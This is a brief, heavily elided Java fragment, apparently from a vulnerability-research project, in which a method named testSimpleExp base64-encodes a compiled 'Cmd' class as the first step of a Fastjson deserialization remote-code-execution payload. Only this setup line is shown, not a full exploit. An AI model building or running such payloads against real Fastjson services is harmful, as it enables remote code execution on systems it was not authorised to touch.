...
import com.rain.bug.common.utils.FileToByteArrayUtil;
...
public class FastjsonSerialize {
    ...
    private static void testSimpleExp() {
        try {
            ...
            String base64Class = new BASE64Encoder().encode(FileToByteArrayUtil.readCallbackRuntimeClassBytes("com/rain/bug/fastjson/rce/Cmd.class"));
